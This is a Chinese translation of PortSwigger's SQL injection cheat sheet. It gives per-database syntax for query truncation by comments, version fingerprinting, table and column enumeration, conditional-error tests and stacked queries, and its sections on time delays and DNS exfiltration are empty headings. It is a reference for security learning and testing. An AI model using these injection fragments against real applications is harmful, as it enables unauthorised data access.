---
description: '原文链接：https://portswigger.net/web-security/sql-injection/cheat-sheet'
---

# SQL注入备忘单

这个SQL注入备忘单包含了一些有用的语法例子，您可以用来执行执行SQL注入攻击时经常出现的各种任务。

### 字符串连接

你可以将多个字符串连接在一起组成一个字符串。

| DataBases | Statements |
| :--- | :--- |
| **Oracle** | `'foo'||'bar'` |
| **Microsoft** | `'foo'+'bar'` |
| **PostgreSQL** | `'foo'||'bar'` |
| **MySQL** | `'foo' 'bar'` \[Note the space between the two strings\] `CONCAT('foo','bar')` |

### 子字符串

您可以从指定的偏移量中提取字符串的部分长度。请注意，偏移量的索引是基于1的。以下每个表达式都会返回字符串 ba。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

### 注释

您可以使用注释来截断查询，并删除输入之后的原始查询部分。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `--comment` |
| Microsoft | `--comment` `/*comment*/` |
| PostgreSQL | `--comment` `/*comment*/` |
| MySQL | `#comment` `-- comment` \[Note the space after the double dash\] `/*comment*/` |

### 数据库版本

你可以查询数据库以确定其类型和版本。这些信息在制定更复杂的攻击时很有用。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT banner FROM v$version SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

### 数据库内容

您可以列出数据库中存在的表，以及这些表包含的列。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft | `SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### 条件错误

您可以测试单个布尔条件，如果条件为真，则触发数据库错误。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### 批处理（或堆叠）查询

您可以使用批处理查询来连续执行多个查询。请注意，虽然后续查询被执行，但结果不会返回给应用程序。因此，这种技术主要用于与盲目漏洞有关的情况，在这种情况下，您可以使用第二个查询来触发一个 DNS 查找、条件错误或时间延迟。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `Does not support batched queries.` |
| Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL | `QUERY-1-HERE; QUERY-2-HERE` |

> Note
>
> 对于MySQL，批量查询通常不能用于SQL注入。然而，如果目标应用程序使用某些PHP或Python API与MySQL数据库通信，这偶尔是可能的。

### 时间延迟





### 有条件的时间延迟





### DNS查找





### 带数据渗出的DNS查找











